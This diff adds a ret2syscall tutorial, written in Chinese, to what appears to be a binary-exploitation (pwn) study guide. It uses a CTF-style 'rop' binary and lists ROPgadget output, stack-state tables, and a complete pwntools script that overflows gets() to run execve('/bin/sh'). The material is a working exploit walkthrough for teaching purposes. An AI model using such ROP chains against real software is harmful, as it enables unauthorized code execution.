@@ -1229,3 +1229,270 @@ int 0x80
 *注：图例制作有误，实际的代码片段应该为`mov edx, eax`或者`mov %eax, (%edx)`*
 
 > <img src="./img/58.png">
+
+### ret2syscall
+
+#### 攻击流程
+
+1. `checksec`查看文件保护措施
+
+> <img src="./img/59.png">
+
+程序开启了`NX`保护，栈不可执行，而且缺少拥有`x`权限的段，排除`ret2shellcode`题型的可能
+
+2. `IDA`反编译
+
+- 寻找后门函数
+
+> <img src="./img/60.png">
+
+- 没有后门函数，寻找`/bin/sh`
+
+> <img src="./img/61.png">
+
+- 找到了一条`/bin/sh`，证实是`ret2syscall`题型，然后回到`main()`
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [esp+1Ch] [ebp-64h] BYREF
+
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 1, 0);
+  puts("This time, no system() and NO SHELLCODE!!!");
+  puts("What do you plan to do?");
+  gets(&v4);
+  return 0;
+}
+```
+
+3. 很明显，`gets()`函数存在栈溢出，然后使用`ROPgadget`来寻找需要的`gadget`
+
+```sh
+ROPgadget --binary rop --only "pop|ret"
+```
+
+```sh
+0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
+0x0809d7b2 : pop ds ; ret
+0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
+0x080bb196 : pop eax ; ret
+0x0807217a : pop eax ; ret 0x80e
+0x0804f704 : pop eax ; ret 3
+0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
+0x0809e1d5 : pop ebp ; pop esi ; pop edi ; ret
+0x0804838e : pop ebp ; ret
+0x080a9a45 : pop ebp ; ret 0x10
+0x08096a29 : pop ebp ; ret 0x14
+0x08070d76 : pop ebp ; ret 0xc
+0x0804854a : pop ebp ; ret 4
+0x08049c00 : pop ebp ; ret 8
+0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
+0x080be23f : pop ebx ; pop edi ; ret
+0x0806eb69 : pop ebx ; pop edx ; ret
+0x08092258 : pop ebx ; pop esi ; pop ebp ; ret
+0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
+0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14
+0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
+0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
+0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
+0x08048913 : pop ebx ; pop esi ; pop edi ; ret
+0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4
+0x08049a94 : pop ebx ; pop esi ; ret
+0x080481c9 : pop ebx ; ret
+0x080d7d3c : pop ebx ; ret 0x6f9
+0x08099c87 : pop ebx ; ret 8
+0x0806eb91 : pop ecx ; pop ebx ; ret
+0x0804838d : pop edi ; pop ebp ; ret
+0x080a9a44 : pop edi ; pop ebp ; ret 0x10
+0x08096a28 : pop edi ; pop ebp ; ret 0x14
+0x08070d75 : pop edi ; pop ebp ; ret 0xc
+0x08048549 : pop edi ; pop ebp ; ret 4
+0x08049bff : pop edi ; pop ebp ; ret 8
+0x0806336b : pop edi ; pop esi ; pop ebx ; ret
+0x0805c508 : pop edi ; pop esi ; ret
+0x0804846f : pop edi ; ret
+0x08049a1b : pop edi ; ret 4
+0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
+0x0806eb6a : pop edx ; ret
+0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
+0x080671ea : pop es ; pop edi ; ret
+0x0806742a : pop es ; ret
+0x08092259 : pop esi ; pop ebp ; ret
+0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret
+0x0805c820 : pop esi ; pop ebx ; ret
+0x0804838c : pop esi ; pop edi ; pop ebp ; ret
+0x080a9a43 : pop esi ; pop edi ; pop ebp ; ret 0x10
+0x08096a27 : pop esi ; pop edi ; pop ebp ; ret 0x14
+0x08070d74 : pop esi ; pop edi ; pop ebp ; ret 0xc
+0x08048548 : pop esi ; pop edi ; pop ebp ; ret 4
+0x08049bfe : pop esi ; pop edi ; pop ebp ; ret 8
+0x0804846e : pop esi ; pop edi ; ret
+0x08049a1a : pop esi ; pop edi ; ret 4
+0x08049a95 : pop esi ; ret
+0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+0x080bb146 : pop esp ; ret
+0x0807b6ed : pop ss ; pop ebx ; ret
+0x080639f9 : pop ss ; ret 0x2c73
+0x080643ba : pop ss ; ret 0x3273
+0x080639e4 : pop ss ; ret 0x3e73
+0x080643a0 : pop ss ; ret 0x4c73
+0x080639cf : pop ss ; ret 0x5073
+0x080639ba : pop ss ; ret 0x6273
+0x08064386 : pop ss ; ret 0x6673
+0x08061f05 : pop ss ; ret 0x830f
+```
+
+4. 根据`execve()`函数的汇编代码，我们需要找到以下几个`gadget`片段
+
+- `pop eax; ret`
+- `pop ebx; ret`
+- `pop ecx; ret`
+- `pop edx; ret`
+
+省略寻找过程，我们最后可以得到以下结果
+
+- `pop eax; ret` => `0x080bb196`
+- `pop ecx; pop ebx; ret` => `0x0806eb91`
+
+- `pop edx; ret` => `0x0806eb6a`
+
+5. 找到需要的`gadget`后，开始拼接`payload`
+
+- 程序首先执行`pop eax; ret`，在栈上，`EIP`指向`pop eax`，`ESP`指向`pop eax; ret`的高一位地址，该地址的值就是将要`pop eax`的内容，因此栈上填入`0xb`
+
+| EIP  | .text        | stack      | ESP  |
+| ---- | ------------ | ---------- | ---- |
+|      |              | 0xb        | ←    |
+| →    | pop eax; ret | 0x080bb196 |      |
+
+- 程序执行`pop eax`，`0xb`被`pop`弹入`eax`，`ESP`向高位移动一位，程序将要进行`ret`，因此栈上填入下一条命令的地址
+
+| EIP  | .text                 | stack      | ESP  |
+| ---- | --------------------- | ---------- | ---- |
+|      | pop ecx; pop ebx; ret | 0x0806eb91 | ←    |
+|      |                       | 0xb        |      |
+| →    | pop eax; ret          | 0x080bb196 |      |
+
+- 程序执行`ret`，`EIP`跳转到`pop ecx; pop ebx; ret`，`ESP`自动上移一位，程序将要进行`pop ecx`，因此栈上填入`0`
+
+| EIP  | .text                 | stack      | ESP  |
+| ---- | --------------------- | ---------- | ---- |
+|      |                       | 0          | ←    |
+| →    | pop ecx; pop ebx; ret | 0x0806eb91 |      |
+|      |                       | 0xb        |      |
+|      | pop eax; ret          | 0x080bb196 |      |
+
+- 程序执行`pop ecx`，`0`被`pop`弹入`ecx`，`ESP`向高位移动一位，程序将要进行`pop ebx`，因此栈上填入`/bin/sh`的地址
+
+`/bin/sh`的地址可以在`IDA`寻找，也可以通过`ROPgadget`寻找
+
+```sh
+ROPgadget --binary ./rop --string "/bin/sh" 
+```
+
+| EIP  | .text                 | stack      | ESP  |
+| ---- | --------------------- | ---------- | ---- |
+|      |                       | 0x080be408 | ←    |
+|      |                       | 0          |      |
+| →    | pop ecx; pop ebx; ret | 0x0806eb91 |      |
+|      |                       | 0xb        |      |
+|      | pop eax; ret          | 0x080bb196 |      |
+
+- 程序执行`pop ebx`，`/bin/sh`的地址被弹入`ebx`，`ESP`向高位移动一位，程序将要进行`ret`，因此栈上填入下一条指令的地址
+
+| EIP  | .text                 | stack      | ESP  |
+| ---- | --------------------- | ---------- | ---- |
+|      | pop edx; ret          | 0x0806eb6a | ←    |
+|      |                       | 0x080be408 |      |
+|      |                       | 0          |      |
+| →    | pop ecx; pop ebx; ret | 0x0806eb91 |      |
+|      |                       | 0xb        |      |
+|      | pop eax; ret          | 0x080bb196 |      |
+
+- 程序执行`ret`，`EIP`跳转到`pop edx; ret`，`ESP`自动上移一位，程序将要进行`pop edx`，因此栈上填入`0`
+
+| EIP  | .text                 | stack      | ESP  |
+| ---- | --------------------- | ---------- | ---- |
+|      |                       | 0          | ←    |
+| →    | pop edx; ret          | 0x0806eb6a |      |
+|      |                       | 0x080be408 |      |
+|      |                       | 0          |      |
+|      | pop ecx; pop ebx; ret | 0x0806eb91 |      |
+|      |                       | 0xb        |      |
+|      | pop eax; ret          | 0x080bb196 |      |
+
+- 程序执行`pop edx`，`0`被`pop`弹入`edx`，`ESP`向高位移动一位，程序将要进行`ret`，因此填入`int 0x80`的地址
+
+寻找`int 0x80`的地址
+
+```sh
+ROPgadget --binary rop --only "int"
+```
+
+| EIP  | .text                 | stack      | ESP  |
+| ---- | --------------------- | ---------- | ---- |
+|      | int 0x80              | 0x08049421 | ←    |
+|      |                       | 0          |      |
+| →    | pop edx; ret          | 0x0806eb6a |      |
+|      |                       | 0x080be408 |      |
+|      |                       | 0          |      |
+|      | pop ecx; pop ebx; ret | 0x0806eb91 |      |
+|      |                       | 0xb        |      |
+|      | pop eax; ret          | 0x080bb196 |      |
+
+- 程序执行`ret`，`EIP`跳转到`int 0x80`，程序将要执行`int 0x80`
+
+| EIP  | .text                 | stack      | ESP  |
+| ---- | --------------------- | ---------- | ---- |
+|      | int 0x80              | 0x08049421 | ←    |
+|      |                       | 0          |      |
+| →    | pop edx; ret          | 0x0806eb6a |      |
+|      |                       | 0x080be408 |      |
+|      |                       | 0          |      |
+|      | pop ecx; pop ebx; ret | 0x0806eb91 |      |
+|      |                       | 0xb        |      |
+|      | pop eax; ret          | 0x080bb196 |      |
+
+- 程序执行`int 0x80`，攻击完成
+
+| EIP  | .text                 | stack      | ESP  |
+| ---- | --------------------- | ---------- | ---- |
+|      |                       | N/A        | ←    |
+| →    | int 0x80              | 0x08049421 |      |
+|      |                       | 0          |      |
+|      | pop edx; ret          | 0x0806eb6a |      |
+|      |                       | 0x080be408 |      |
+|      |                       | 0          |      |
+|      | pop ecx; pop ebx; ret | 0x0806eb91 |      |
+|      |                       | 0xb        |      |
+|      | pop eax; ret          | 0x080bb196 |      |
+
+6. `gdb`调试计算偏移值
+
+> <img src="./img/62.png">
+
+上图中，`eax`是`v4`的地址，偏移值为`0x88 - 0x1c = 108`，加上`ebp`本身的4字节，共112字节
+
+7. 构造攻击脚本
+
+```py
+from pwn import *
+
+eax = 0x080bb196
+ecx_ebx = 0x0806eb91
+edx = 0x0806eb6a
+int_0x80 = 0x08049421
+binsh = 0x080be408
+
+payload = flat([b'a' * 112, eax, 0xb, ecx_ebx, 0, binsh, edx, 0, int_0x80])
+
+io = process('./rop')
+io.sendline(payload)
+io.interactive()
+```
+
+8. 执行脚本，完成攻击
+
+> <img src="./img/63.png">
